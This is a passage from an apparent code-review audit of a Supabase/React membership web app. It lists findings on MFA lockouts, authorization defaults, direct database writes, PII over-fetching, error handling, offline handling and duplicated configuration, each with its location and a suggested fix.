- **What breaks:** listFactors().catch(() => setFactor(null)) (49) collapses a transient error and a genuine 'no factor' into the same null. A user WITH real 2FA whose factor list flakes sees 'No active 2FA method found. Please contact support.' (96). The challenge dialog is non-dismissible (hideCloseButton + preventDefault on escape/outside, 77-81) and its only other control is Cancel → signOutSafe + redirect. A transient backend blip locks a legitimate user out of their own account with no in-app recovery. StepUpMfaDialog shares the collapse but is dismissible, so it degrades to an aborted action rather than a lockout.
- **Smallest fix:** Distinguish load-error from no-factor: on error show a Retry (listFactors force) instead of the support dead-end, and keep the session rather than forcing sign-out on a fetch failure.

### [Medium] Disable-all 2FA is a non-atomic unenroll loop — partial failure leaves inconsistent factor state after the password is already spent  `error-handling` (CONFIRMED)
- **Where:** src/components/TotpMfaManagement.tsx:153-165
- **What breaks:** After the password re-auth succeeds, factors are removed in a sequential for-loop of unenroll() calls (156-158). If unenroll throws on factor #2 of 3, #1 is already gone, #2/#3 remain, the catch shows a generic toast (165), and refresh() shows a half-disabled state — no rollback, no retry, and the re-auth confirmation is already consumed. The user may believe 2FA is off while a factor still guards login, or vice versa.
- **Smallest fix:** Use Promise.allSettled and report exactly which factors failed, or perform the disable as one server-side operation; never leave partial state behind a success-implying flow.

### [Medium] markCurrentSessionVerified failure silently desyncs client AAL2 from the server proof — admin edge actions then 403  `ownership` (CONFIRMED)
- **Where:** src/services/mfa.service.ts:334-349 (called from persistAal2Session:331)
- **What breaks:** After a successful verify, mark_two_factor_login_verified via `(supabase as any).rpc` records the server-side proof row in two_factor_login_sessions. On failure it only log.warn('non-blocking') and returns (343-348), so the client treats the session as AAL2 and proceeds while the server has NO proof row. requireFreshAdmin2fa (supabase/functions/_shared/admin-step-up.ts:34-42) keys admin step-up actions off exactly that row and returns 403 'Fresh 2FA verification required' — so a verified admin is wrongly blocked from privileged edge functions with a dropped RPC and no retry. Two sources of truth (client AAL2 token vs server verified-session table) drift on every failure.
- **Smallest fix:** Treat the server proof as part of the escalation contract: retry it, and if it cannot be recorded, surface/report rather than proceed as verified; remove the `as any` and type the RPC.

### [Medium] AdminRoute treats a transient listFactors failure as 'no TOTP' and can lock a 2FA-enabled admin out to the setup screen  `error-handling` (CONFIRMED)
- **Where:** src/components/AdminRoute.tsx:44-50,101-122
- **What breaks:** hasTotp comes from MfaService.hasVerifiedTotp() which throws if listFactors fails; Promise.allSettled then defaults hasTotp=false (50). If admin_2fa_grace_active happens to return false while listFactors is the call that flaked, the lockout branch (101, needs !hasTotp && graceActive===false) fires and an admin who genuinely HAS TOTP is shown 'Admin 2FA setup required' and denied /admin/*. Availability hit for admins during any listFactors blip.
- **Smallest fix:** Only act on hasTotp when its fetch succeeded; if the factor check failed, hold/retry rather than assuming false and locking out.

### [Medium] GoogleSignInButton arms the OAuth-callback-pending guard before the OAuth call and never clears it on failure  `error-handling` (CONFIRMED)
- **Where:** src/components/GoogleSignInButton.tsx:64,70-93
- **What breaks:** markOAuthCallbackPending() is called at line 64, before supabase.auth.signInWithOAuth (70). If signInWithOAuth returns an error (77-83) or throws (84-89), no redirect occurs, yet neither branch nor the finally (90-93) calls clearOAuthCallbackPending — only oauthInFlightRef and loading are reset. The pending flag stays armed with its 12s watchdog, so ProtectedRoute (14) and AuthRedirectHandler (51) suppress navigation / show the 'Finishing sign-in…' spinner for up to 12s after a failure the user was already toasted about, stranding them in a false 'signing in' state.
- **Smallest fix:** Call clearOAuthCallbackPending() in the error branch and catch; only leave the flag armed once the redirect is actually initiated.

### [Medium] Server 2FA proof is keyed to the rotating access token and expires in 10 min while client AAL2 persists — admins silently lose step-up rights  `ownership` (CONFIRMED)
- **Where:** src/services/mfa.service.ts:334-342 + supabase/migrations/20260428213052…sql:41-54 + supabase/functions/_shared/admin-step-up.ts:22-49
- **What breaks:** markCurrentSessionVerified stores SHA-256 of the CURRENT access_token as session_token_hash, and mark_two_factor_login_verified sets expires_at = now()+10 minutes. requireFreshAdmin2fa recomputes the hash from the access token in the request's Authorization header and looks up that exact row. Two independent drifts follow: (1) when GoTrue fires TOKEN_REFRESHED the access token rotates but the aal claim (AAL2) is preserved — the new token's hash no longer matches the stored row, so a genuinely-fresh AAL2 admin gets 403 'Fresh 2FA verification required'; (2) after 10 minutes the row expires, yet getMfaGateDecision only challenges when currentAal !== 'aal2' (mfa.service.ts:181), so an AAL2 client never re-prompts — the admin is stuck: client believes it's fine, every step-up-guarded edge action 403s, and nothing in the UI triggers re-verification unless that specific action explicitly catches 403 and opens StepUpMfaDialog. The client's AAL2 belief and the server's proof lifecycle are two owners of one fact that diverge on the first refresh or after 10 minutes.
- **Smallest fix:** Key the proof on the stable session/user identity plus aal (or store the GoTrue session id), not the rotating access-token hash; and drive a step-up prompt from the 403 so client and server agree on when re-verification is actually needed.
- _added-in-verification_

### [Low] auth_redirect written to BOTH localStorage and sessionStorage — stale cross-session redirect can hijack a later login  `ownership` (CONFIRMED)
- **Where:** src/components/GoogleSignInButton.tsx:21-32 (storeAuthRedirect) + src/components/AuthRedirectHandler.tsx:12-18 (readStoredRedirect)
- **What breaks:** storeAuthRedirect writes the same auth_redirect key to localStorage AND sessionStorage (22,28); readStoredRedirect prefers sessionStorage then falls back to localStorage (14). localStorage persists across browser sessions, so a target stored during an abandoned earlier login can survive and become the destination of a later, unrelated login on '/' or '/login'. The value is normalized (not an open redirect), but two stores holding one fact is a kept-in-sync smell and a stale-state correctness bug.
- **Smallest fix:** Pick one store (sessionStorage for a per-login intent) and always clear it; do not persist login-redirect intent in localStorage across sessions.

### [Low] MfaEnforcementGuard recycles its onAuthStateChange subscription on every token refresh  `over-engineering` (CONFIRMED)
- **Where:** src/components/MfaEnforcementGuard.tsx:46-93
- **What breaks:** The effect depends on [user, session, loading] (93) and creates/tears down supabase.auth.onAuthStateChange inside it (82-91). AuthContext hands a new session object on every TOKEN_REFRESHED, so the guard unsubscribes and resubscribes on each rotation and needlessly re-runs runCheck. Around the teardown boundary it can momentarily run zero or duplicate listeners during rapid refreshes on the very channel MFA re-eval relies on — fragile ordering for no benefit.
- **Smallest fix:** Subscribe once (effect keyed on user id only) and read the latest session from a ref, so token refreshes don't recycle the subscription.

### [Low] IdleMount fallback ignores the caller's timeout, firing far earlier without requestIdleCallback  `under-engineering` (CONFIRMED)
- **Where:** src/components/IdleMount.tsx:44
- **What breaks:** When requestIdleCallback is unavailable (Safari <17) the fallback is setTimeout(onReady, Math.min(timeout, 200)) — capped at 200ms regardless of the caller's timeout (default 1500). Identical <IdleMount timeout={1500}> mounts its children ~1300ms earlier on Safari than on Chromium, undermining the CWV deferral the component exists for and creating browser-divergent mount timing for the side-effect components it wraps.
- **Smallest fix:** Use the passed timeout for the fallback (or document the cap intentionally); don't silently clamp to 200ms.

---

## Profile, onboarding, projects, applications & certification components

### [High] Certification tabs query with no user_id filter — every member's cert PII is one RLS regression from leaking  `security` (CONFIRMED)
- **Where:** src/components/ClassCertificationsTab.tsx:54-57 (useCertifications) and src/components/ProjectCertificationsTab.tsx:54-57 (useProjectCertifications)
- **What breaks:** Both hooks call supabase.from('class_certifications'/'project_certifications').select('id, airtable_record_id, synced_at, display_title, raw_data').order('synced_at') with NO .eq('user_id', ...). Verified: scoping is 100% delegated to RLS; the query expresses zero ownership intent. raw_data is a full Airtable record dump rendered directly in CertCard. If an RLS policy is dropped, loosened, or the table ships without one (this repo hand-applies prod migrations with no CI, and the identical PGRST202 outage already happened once per memory), every user instantly sees every other member's certification PII. ProjectCertificationsTab additionally casts (supabase as any) at line 54, so the table is outside generated types and a column/table rename fails silently at runtime, not compile time.
- **Smallest fix:** Add .eq('user_id', userId!) to both selects (defense-in-depth with RLS) and move the read into a hook/service; regenerate Supabase types to drop the `as any`.

### [High] GenericCoursePage writes journey_progress directly — 'Mark Incomplete' is permanently broken and the injection whitelist is skipped  `boundary` (CONFIRMED)
- **Where:** src/components/GenericCoursePage.tsx:169-200 (toggleLesson) vs src/services/journey.service.ts:154-236 (upsertTask)
- **What breaks:** Verified line-by-line. toggleLesson does supabase.from('journey_progress').upsert({... completed: newCompleted, completed_at: newCompleted ? now : null}) inline. JourneyService.upsertTask (the table's owner) enforces three things this path skips: (a) VALID_PHASES/VALID_TASK_IDS whitelists (A03 guard) — here phase is `phase as any` (line 179) and lessonId passed raw; (b) uncompletion MUST route through the mark_task_incomplete SECURITY DEFINER RPC (journey.service.ts:176-192) because a DB BEFORE-UPDATE guard rejects any direct clear of completed/completed_at unless app.allow_uncomplete is set. So clicking 'Completed — Mark Incomplete' (GenericCoursePage line 741) sends a direct update the DB guard refuses → catch fires 'Couldn't save your progress' → the lesson can NEVER be un-completed from any course page. (c) the 2s pool-dedupe. Two writers for one fact; ProfileSetupDialog uses the service, this page doesn't.
- **Smallest fix:** Delete the inline upsert; call JourneyService.upsertTask(user.id, phase, lessonId, newCompleted) so uncompletion hits the RPC and inputs hit the whitelist.

### [High] ProfileService.update silently ignores the email argument — forms claim 'email updated' and write nothing  `other` (CONFIRMED)
- **Where:** src/services/profile.service.ts:76-123 (email param never referenced; rawData has no email key) — callers ProfileEditPanel.tsx:192 and ProfileSetupDialog.tsx:315
- **What breaks:** Verified: update(userId, input, email?) accepts email, logs hasEmail:!!email (line 82) for telemetry, but the rawData payload (lines 86-103) contains no email column and the param is never used again. Both forms collect+validate+require email for non-OAuth users and pass form.email.trim() in (ProfileEditPanel:192, ProfileSetupDialog:315). I also confirmed the setup dialog's autosave payload (ProfileSetupDialog.tsx:167-181) has no email either — so email is persisted nowhere. A non-OAuth member edits their contact email, sees 'Profile updated successfully', panel closes, DB unchanged. The setup dialog marks the field required with a red asterisk. Silent data loss on a field users are explicitly told is saved.
- **Smallest fix:** Either persist email inside ProfileService.update (add to an allow-listed, sanitized payload with a real write) or remove the email field/param from both forms and the service so the UI stops claiming to save it.

### [High] AvatarUpload writes profiles directly and never checks the update error — shows success with stale data  `error-handling` (CONFIRMED)
- **Where:** src/components/AvatarUpload.tsx:64-67 (set) and 94-97 (clear)
- **What breaks:** Verified: both paths do `await supabase.from('profiles').update({ avatar_url } as any).eq('user_id', userId)` with the result discarded — no { error } destructured, no throw. This is a direct profiles write from a component (decisions.md §1 = security regression; it bypasses ProfileService.updateFields whose ALLOWED_PROFILE_FIELDS explicitly lists avatar_url at profile.service.ts:178). Because the error is never inspected, an RLS denial or transient PostgREST failure still runs setPreviewUrl/onUploaded/toast.success — the UI shows the new picture (built from the storage publicUrl) and 'Profile picture updated', but on reload avatar_url is unchanged. Storage object and profiles row silently diverge.
- **Smallest fix:** Route through ProfileService.updateFields(userId, { avatar_url }); destructure { error } and throw so the existing catch reports it.

### [High] SubmittedApplicationsTab pulls whole tables to the browser and joins client-side — unbounded PII fan-out  `security` (CONFIRMED)
- **Where:** src/components/SubmittedApplicationsTab.tsx:144-239, 269-299
- **What breaks:** Verified six unpaginated queries then a client-side JOIN in useMemo (line 269). general_applications.select('*') has NO filter or limit (line 161 — every general application, every long essay column, all users); project_applications.select('*').eq('status','completed') has no limit (147-151); plus full projects/clients, profiles selecting email/discord/linkedin/bio/professional_background/experience_areas for all applicants (208-223), and journey_progress (226-239). Payload grows linearly with the platform and ships every applicant's contact + free-text essays to the browser at once. The join + eligibility math belongs in a DB view/RPC. It also concentrates maximum PII behind a single RLS assumption — a regression on general_applications' admin policy is a full applicant-data dump.
- **Smallest fix:** Replace the six-query client join with one server-side RPC/view returning already-joined, paginated admin rows scoped to admin role, selecting only displayed columns.

### [High] Client-driven course completion re-fires Discord notifications on every revisit of a completed course  `boundary` (CONFIRMED)
- **Where:** src/components/GenericCoursePage.tsx:158-167 (completion effect) with 118 (prevCompletedCountRef init)
- **What breaks:** Verified and STRONGER than first pass. The effect fires DiscordNotifyService.phaseCompleted when prevCompletedCountRef crosses from <total to ==total. On mount, first render has completedCount=0 so the effect sets the ref to 0; then the async progress load (line 123) resolves, setCompletedSet runs, completedCount recomputes to N. For an already-completed course N===total, and ref(0) < total → the threshold is re-crossed and phaseCompleted FIRES on EVERY page load/remount, not just a two-tab race. There is no server-side idempotency key, and the notify is fire-and-forget (not awaited, no catch) so its own failures vanish as unhandled rejections. Any member reopening a finished course spams the 'X completed the phase' Discord message.
- **Smallest fix:** Move completion detection/notification server-side (trigger on journey_progress) or gate the notify behind an idempotent server call keyed on (user, phase); at minimum await+report and guard against re-fire after a fresh progress load.

### [Medium] Admin 'core courses complete' counts any progress as a finished course — inflated eligibility signal  `other` (CONFIRMED)
- **Where:** src/components/SubmittedApplicationsTab.tsx:258-267 (coreProgressMap) and 288 (completedCoreCourses)
- **What breaks:** coreProgressMap adds a phase to the user's set if ANY single journey_progress row for that phase has completed=true (query is .eq('completed', true) with no per-phase total). completedCoreCourses = set.size. So a user who finished ONE lesson in each of the 6 core phases shows as '6 of 6 core courses' complete to the reviewing admin. This diverges from the member-facing ReadinessChecklist, which requires count >= TOTAL_* per phase before marking a course finished. Admins make application/acceptance decisions on a completion metric that overstates real progress, with no indication it's a partial-progress proxy.
- **Smallest fix:** Count a core course complete only when the phase's completed-task count meets that course's required total (mirror ReadinessChecklist's per-phase TOTAL_* thresholds), ideally via a server-side computed field.
- _added-in-verification_

### [Medium] GenericCoursePage progress load is a floating promise with no error handling  `error-handling` (CONFIRMED)
- **Where:** src/components/GenericCoursePage.tsx:123-138
- **What breaks:** Verified: the initial load is supabase.from('journey_progress').select(...).eq(...).eq('phase', phase as any).then(({data}) => {...}) with no .catch and no error branch. On any failure (network, RLS, PGRST002 schema-cache flake this app retries elsewhere) the promise rejects unhandled: progressLoaded never flips, the auto-expand effect (141) never runs, every lesson shows incomplete, nothing surfaces to user or operators. A member who completed a course sees 0% with no explanation. It reads the table directly instead of via JourneyService.getProgress, so it also skips the retryPostgrest + reporting wrapper the service provides.
- **Smallest fix:** Use JourneyService.getProgress (retry + reporting) or add a .catch that reports and sets an error state; set progressLoaded in both success and failure paths.

### [Medium] ProfileSetupDialog autosave retries forever every 1.5s with no backoff and never reports the failure  `error-handling` (CONFIRMED)
- **Where:** src/components/ProfileSetupDialog.tsx:193-210
- **What breaks:** Verified. On save failure the catch sets status 'error' and pendingRetryRef=true but logs/reports nothing (rule §4: user sees retry, operators blind). The finally reschedules performAutosave in 1500ms (line 208). The retry re-serializes the same payload; lastSerializedRef only advances on success (line 195), so serialized !== last → it doesn't early-return, fails again, sets pendingRetryRef again, reschedules — an unbounded fixed-interval loop with no cap and no exponential backoff, despite the comment claiming 'retry once'. For a persistent cause (RLS denial, validation rejection, navigator.onLine-true-but-offline) it hammers PostgREST every 1.5s for as long as the dialog is open, across all users, invisibly.
- **Smallest fix:** Report the error, add a retry cap with exponential backoff, and stop rescheduling once the cap is hit.

### [Medium] ProfileSetupDialog leaks a visibilitychange listener on every keystroke  `under-engineering` (CONFIRMED)
- **Where:** src/components/ProfileSetupDialog.tsx:229-246
- **What breaks:** Verified. The flush effect depends on [performAutosave] (line 246), which is recreated on every form change (its deps are [user, form], line 211). Each run calls document.addEventListener('visibilitychange', <new anon fn>) (line 240), but the cleanup (243-245) removes ONLY the beforeunload listener — visibilitychange is never removed. So while the user types, a visibilitychange listener accumulates per keystroke; on the next tab-hide, every stale closure fires flush()→performAutosave simultaneously, and the listeners persist for the page lifetime. Listener/memory leak plus a burst of concurrent autosaves on tab switch.
- **Smallest fix:** Return removeEventListener for visibilitychange in the cleanup, or attach both listeners in an effect that doesn't depend on performAutosave (read it from a ref).

### [Medium] ProfileSetupDialog 'Complete' is a non-atomic multi-step workflow that misreports later-step failures as a save failure  `error-handling` (CONFIRMED)
- **Where:** src/components/ProfileSetupDialog.tsx:314-337
- **What breaks:** Verified: handleComplete awaits ProfileService.update (commits profile_completed=true), then refreshProfile, then JourneyService.upsertTask('first_steps','profile',true), then a second ProfileService.fetch, then two fire-and-forget DiscordNotify calls — all in one try. If upsertTask or the second fetch throws AFTER the profile is already committed, the catch sets errors.general as if the profile save failed (line 331). The user re-submits an already-completed profile while the journey 'profile' task may or may not be set. The DiscordNotify calls (322-328) are unawaited floating promises — unhandled rejection on failure. Partial-commit workflow orchestrated in the component with no compensation and misleading error attribution.
- **Smallest fix:** Separate the required profile write from best-effort follow-ups; surface an error only for the profile write, and await+catch (or move server-side) the journey/discord steps.

### [Medium] GeneralApplicationTab deletes a submitted application via direct supabase in the component, with no operator reporting  `boundary` (CONFIRMED)
- **Where:** src/components/GeneralApplicationTab.tsx:63-85
- **What breaks:** Verified: handleDeleteApplication runs supabase.from('general_applications').delete().eq('id',...).eq('user_id',...) inline (67-72) — a destructive permanent mutation that bypasses the useGeneralApplication hook that owns every other read/write for this table (dependency-direction + single-writer drift). The catch only toasts the user (79-81); a failed permanent delete is never reported to operators. Reaching into the table directly for a delete is the front-door violation decisions.md flags and duplicates deletion logic that belongs in the general-application data layer.
- **Smallest fix:** Add a delete method to the general-application service/hook that reports on failure, and call it from the component.

### [Medium] delete-account uses raw functions.invoke instead of auditedInvoke and swallows the real error  `error-handling` (CONFIRMED)
- **Where:** src/components/ProfileEditPanel.tsx:221-244
- **What breaks:** Verified auditedInvoke and invokeEdge both exist (src/integrations/supabase/audited-invoke.ts:27, src/lib/edge/invokeEdge.ts:82) and src/components/CLAUDE.md line 6 explicitly bans raw invoke to edge functions. Yet account deletion — the most destructive user action — calls supabase.functions.invoke('delete-account', ...) directly (228). On res.error it throws a generic new Error('Failed to delete account') (232), discarding the server's actual error, and the catch only toasts (240). If deletion half-fails (auth user gone but rows remain, or vice versa) operators get no audit trail and the user gets a flat 'try again' with no diagnosability.
- **Smallest fix:** Call auditedInvoke('delete-account') (or invokeEdge); preserve/report the underlying error instead of replacing it with a generic string.

### [Medium] Certification sync uses raw functions.invoke and console.error instead of auditedInvoke/report  `error-handling` (CONFIRMED)
- **Where:** src/components/ClassCertificationsTab.tsx:141-170 and src/components/ProjectCertificationsTab.tsx:156-185
- **What breaks:** Verified: handleSync invokes 'fetch-class-certifications'/'fetch-project-certifications' via raw supabase.functions.invoke (145/160) and on failure calls console.error + toast (163-166 / 178-181). decisions.md §4 says a bare console.error is NOT reporting (browser-console only) and privileged/edge calls must use auditedInvoke (which exists). So when the Airtable-sync edge function fails for a member, operators have zero server-side signal — the failure lives only in that user's devtools. At 767 users a systemic sync outage is invisible.
- **Smallest fix:** Route both through auditedInvoke and replace console.error with the reporting logger.

### [Medium] WelcomeDialog uses localStorage unguarded — storage-disabled users are trapped on the welcome modal  `error-handling` (CONFIRMED)
- **Where:** src/components/WelcomeDialog.tsx:120-131
- **What breaks:** Verified: the mount effect calls localStorage.getItem(key) (123) and handleClose calls localStorage.setItem(...) (128) with no try/catch. In Safari private mode / storage-blocked contexts getItem throws during the effect and setItem throws in the close handler: the 'seen' flag can never persist, so the dialog reappears every load, and the throw inside the 'Let's Go!'/Skip click path (handleClose via onOpenChange, 139) can bubble to the error boundary. Users with storage disabled effectively cannot dismiss onboarding. GettingStartedChecklist already wraps the identical pattern in try/catch, so the safe idiom is known in this codebase.
- **Smallest fix:** Wrap both localStorage reads and writes in try/catch (matching GettingStartedChecklist) and default to shown-once behavior gracefully.

### [Medium] SubmittedApplicationsTab keys general apps by user_id and silently drops all but one per user  `other` (CONFIRMED)
- **Where:** src/components/SubmittedApplicationsTab.tsx:247-251
- **What breaks:** Verified: generalAppMap does map.set(g.user_id, g) over the UNfiltered general_applications.select('*') (line 161, no order). If a user has more than one general_applications row (draft + resubmission, or historical rows), last-iterated wins and the rest are discarded — and iteration order of an unordered select is arbitrary. Admins reviewing an applicant may see a stale draft's answers instead of the submitted version (or vice versa) with no indication another exists, and selection decisions are made on the wrong record.
- **Smallest fix:** Filter to the intended general app (e.g. status='completed', latest by completed_at) server-side, or key by a stable rule and surface when multiples exist.

### [Medium] SubmittedApplicationsTab renders partial-load failures as legitimate empty data  `error-handling` (CONFIRMED)
- **Where:** src/components/SubmittedApplicationsTab.tsx:158-239 (only appsLoading gates render)
- **What breaks:** Verified: only the primary apps query exposes isLoading and gates the spinner. The profiles, generalApps, projects, clients, and coreProgress queries have no error surfacing and don't gate render — on failure their data is undefined and every valueGetter falls back to 'Unknown'/'—'/0 (e.g. applicant getter returns 'Unknown' when profile missing, line 311). So if the profiles fetch fails (RLS/transient), the admin grid renders fully populated-looking rows with blank names/emails and '0 core courses' for everyone, indistinguishable from real data. Admins decide on silently incomplete data with no error and no operator report.
- **Smallest fix:** Surface an error/retry state when any dependent query errors, and report it; don't let undefined masquerade as 'no data'.

### [Medium] useProfileName and cert-card helpers are duplicated across both certification tabs, each reading profiles directly  `under-engineering` (CONFIRMED)
- **Where:** src/components/ClassCertificationsTab.tsx:20-39 & 65-130 and src/components/ProjectCertificationsTab.tsx:20-39 & 65-145
- **What breaks:** Verified: useProfileName is copy-pasted verbatim in both tabs (queries supabase.from('profiles') directly, not via ProfileService), as are extractMonthYear and the CertCard scaffold. This is the 'rewrite code that already exists' drift: two divergent copies of a profiles read that must stay in sync, neither centralizing sanitization/typing. A column rename, added user-scoping, or name-format change must be made in N places and will drift — the two already differ (ProjectCertificationsTab casts (supabase as any) on its cert query while ClassCertificationsTab doesn't).
- **Smallest fix:** Extract one shared useProfileName hook (backed by ProfileService) and a shared CertificationCard/date-util, consumed by both tabs.

### [Low] MyProjectsTab defaults applicant_status to 'active_participant' — fail-open default gates Active-Teammate UI and Hand-off tooling  `security` (PLAUSIBLE)
- **Where:** src/components/MyProjectsTab.tsx:511-514 (`applicant_status: statusMap[p.id] ?? 'active_participant'`) with 206-209 (canUseHandoff = isActive || isAdmin)
- **What breaks:** Verified the code path. The projects list is enriched with statusMap[p.id] ?? 'active_participant', and that value drives isActive (206), the 'Active Teammate' badge, and canUseHandoff which mounts HandoffPanel. In the current flow the fallback is hard to reach because projectIds are derived from myApps and the projects query filters .in('id', projectIds), so every returned project has a statusMap entry — hence PLAUSIBLE rather than CONFIRMED-exploitable today. But it is a fail-OPEN default on authorization-adjacent state: any future divergence between the two queries (duplicate application rows, RLS returning a project without its application row, ordering skew) silently presents the member as an active teammate and unlocks the hand-off UI, and HandoffPanel gating on client-trusted status is itself weak.
- **Smallest fix:** Default the status to a non-privileged value (or drop rows with no matching application) so a missing status never renders as active or unlocks HandoffPanel; enforce hand-off authorization server-side.

### [Low] ReadinessChecklist imports constants from a page module and computes apply-eligibility client-side from static totals  `dependency` (CONFIRMED)
- **Where:** src/components/ReadinessChecklist.tsx:5-10, 19-73
- **What breaks:** Verified: a shared component imports TOTAL_FIRST_STEPS and FIRST_STEPS_TASK_IDS from @/pages/FirstStepsPage (line 5) — a component depending UPWARD on a page, reversing UI layering and pulling page code into this component's bundle (defeats route-split if the page is split). It fires six separate useCompletedCount queries (24-29) and derives readiness purely by comparing counts to hardcoded TOTAL_* constants in static data files (36-69); the eligibility rule lives in a display component, so adding a lesson silently shifts who is 'ready' with no server authority. If any of the six counts errors it just shows as not-complete, indistinguishable from genuine incomplete.
- **Smallest fix:** Move shared totals/task-ids into src/data or a lib module, source eligibility from a single hook/service, and collapse the six count queries into one.

### [Low] ClassImageUpload orphans storage objects on remove/replace  `ownership` (CONFIRMED)
- **Where:** src/components/ClassImageUpload.tsx:45-46, 66
- **What breaks:** Verified: handleRemove only calls onChange(null) (66) and never deletes the object from the class-hero-images bucket. When no classId is supplied the path is `${userId}/new-${crypto.randomUUID()}.${ext}` (45-46), so every re-upload/replace before a class id exists writes a brand-new object and abandons the previous one. The bucket accumulates orphaned hero images nothing references — unbounded storage cost with no owner responsible for reaping them.
- **Smallest fix:** On remove/replace, delete the prior object (or use a deterministic per-class path and upsert), and reconcile orphans server-side when a class is saved/deleted.

### [Low] Systemic: onboarding/projects/applications/cert components reach past hooks/services straight into Supabase  `boundary` (CONFIRMED)
- **Where:** src/components/GenericCoursePage.tsx:123-138/174, MyProjectsTab.tsx:211-249/469-517, MyRegisteredClassesTab.tsx:37-52, ClassCertificationsTab.tsx:25-62, ProjectCertificationsTab.tsx:25-62, SubmittedApplicationsTab.tsx:144-239, AvatarUpload.tsx:56-97, ClassImageUpload.tsx:48-53
- **What breaks:** Verified across every cited file: decisions.md §1 (echoed in src/components/CLAUDE.md) mandates UI -> hooks -> services -> integrations and flags a raw supabase.from(...) inside src/components as a violation (a security regression for profiles). In this section the rule is the exception, not the norm — nearly every tab embeds its own supabase queries/RPCs/storage calls with bespoke, inconsistent error handling, duplicating access that existing hooks (use-journey-progress, ProfileService, use-classes) already provide. Cumulatively RLS becomes the only consistent guard; sanitization/typing/retry/reporting are applied unevenly, and there is no single place to fix a query when the schema changes.
- **Smallest fix:** Extract each inline query into the matching hook/service (reusing existing ones) and wire a lint rule forbidding supabase imports under src/components into the arch gate.

---

## Community, membership, notifications, PWA & dashboard components

### [High] OfflineBanner locks the entire app behind a full-screen overlay driven solely by navigator.onLine  `error-handling` (CONFIRMED)
- **Where:** src/components/OfflineBanner.tsx:10 (useState(!navigator.onLine)) and :26-29 (fixed inset-0 z-[9999] overlay); :49 Try Again → window.location.reload()
- **What breaks:** navigator.onLine only reports whether a network interface exists, not whether the internet is reachable; it returns false on captive portals, some VPNs, corporate proxies, browser bugs, and flaky mobile handoffs. When wrongly false, the offline event fires and this paints a z-[9999] fixed inset-0 overlay over EVERYTHING — every page, dialog, and unsaved form is blocked. The only escape is a Try Again button that calls window.location.reload(), throwing away in-progress work and (if actually offline) failing. For 767 production users this is an app-wide lockout from a false signal, with no dismiss.
- **Smallest fix:** Do not hard-block the whole app on navigator.onLine. Downgrade to a non-blocking, dismissible bar (like UpdateAvailableBanner) and confirm real connectivity with an actual request before covering the screen.

### [High] 'Reset Push' unregisters ALL service workers and always reports success even on failure  `error-handling` (CONFIRMED)
- **Where:** src/components/PushNotificationToggle.tsx:161-167 (handleResetPush awaits resetPushState with no try/catch, then unconditional toast.success) → src/services/push-subscription.service.ts:353-361 (resetPushState catches its own error, returns void; :356-357 unregisters EVERY registration)
- **What breaks:** handleResetPush awaits resetPushState (which returns void and swallows its error into reportError) and then unconditionally fires toast.success('Push setup reset') — the user is told it succeeded even when it silently failed. Worse, resetPushState calls navigator.serviceWorker.getRegistrations() and unregisters EVERY registration, killing the PWA's main service worker, not just push. A routine 'my push is stuck' click destroys offline support and the UpdateAvailableBanner/deploy-stale mechanism until a hard reload. The caller cannot know any of this happened.
- **Smallest fix:** Make resetPushState return a success boolean and only toast success when true (toast error otherwise); scope the unregister to the push/service-worker used for push, or explicitly re-register the app SW afterward.

### [Medium] GA4 measurement ID and page_view dispatch duplicated in AnalyticsTracker, bypassing the fail-closed consent module  `boundary` (CONFIRMED)
- **Where:** src/components/AnalyticsTracker.tsx:10 (MEASUREMENT_ID='G-WYQKEKXSRR') and :22-27 (window.gtag('event','page_view',...)) vs src/lib/consent/loadAnalytics.ts:9 (GA4_ID='G-WYQKEKXSRR') and :120-123 (exported trackPageView)
- **What breaks:** The GA4 property ID is a fact with two owners — hard-coded once in loadAnalytics.ts and again in the component. When the property is rotated one gets updated and the other keeps firing to the dead property, silently splitting/losing analytics. loadAnalytics.ts's header says nothing may send analytics from outside src/lib/consent and it exports trackPageView() as the entrypoint, yet AnalyticsTracker reimplements page_view inline with different params (send_to/page_location/page_title) and talks to window.gtag directly, dodging the consent-module boundary. Two divergent page_view paths guarantee eventual mismatch.
- **Smallest fix:** Delete the local MEASUREMENT_ID and the inline gtag call; import and call trackPageView(path) from src/lib/consent/loadAnalytics.ts so the ID and the dispatch have exactly one owner.

### [Medium] Professional yearly price hard-coded ('$192', '$16 × 12') in the component, shadowing the config monthly price  `ownership` (CONFIRMED)
- **Where:** src/components/MembershipTiersGrid.tsx:375-381 (derivePriceView, professional + yearly branch: priceDisplay:'$192', priceSubtitle:'USD per year ($16 × 12)')
- **What breaks:** The yearly price for the Professional tier is a literal '$192' with subtitle '$16 × 12' baked into render logic, restating the monthly price ($16) that lives in @/config/membership-tiers. This is money shown to users stored in two places. The inline comment even calls it a placeholder, but it still renders to real users: if an admin changes the Professional monthly price in the config, this card keeps displaying $192/$16 with no error — members see a stale, wrong annual price on a checkout-adjacent surface, a direct trust/billing-dispute hazard, and it is a pricing derivation fused into JSX.
- **Smallest fix:** Derive the yearly figure from the config monthly price (or add an explicit yearly SKU/price field to the tier config) and read it here; never hard-code a price literal that shadows the config.

### [Medium] Mark-all-read fans out into one write + one invalidation per unread announcement (N+1 storm)  `boundary` (CONFIRMED)
- **Where:** src/components/NotificationBell.tsx:125-129 (handleMarkAllRead: unreadAnnouncements.forEach(a => markAnnouncementRead.mutate(a.id))) → src/hooks/use-announcements.ts:80-90 (useMarkAnnouncementRead: onMutate optimistic setQueryData + onSettled invalidateQueries(READ_IDS_KEY))
- **What breaks:** Notifications get a single markAllRead() call, but announcements are marked read by looping mutate() over every unread item. The bell loads up to 20 announcements (useLatestAnnouncements(20)), so one 'Mark all as read' click fires up to 20 concurrent markRead writes, each with its own optimistic cache write AND its own onSettled invalidateQueries(READ_IDS_KEY) — ~20 refetches of the read-ids query in a burst. At 767 users this is needless DB/PostgREST load and cache thrash, and any subset of those writes can fail independently, leaving a partially-read state with no error surfaced. There is no bulk markAllAnnouncementsRead equivalent to the notifications path.
- **Smallest fix:** Add a single bulk 'mark all announcements read' service call + mutation (mirroring NotificationService.markAllRead) and invalidate READ_IDS_KEY once, instead of looping per-id mutations.

### [Medium] AnnouncementBanner writes to and reads localStorage during render (impure render body)  `dependency` (CONFIRMED)
- **Where:** src/components/AnnouncementBanner.tsx:149-151 (localStorage.setItem('tf:lastBannerHeight','0') inside the visibleBanners.length===0 render branch) and :130-134 (reservedHeight IIFE reads localStorage.getItem during render)
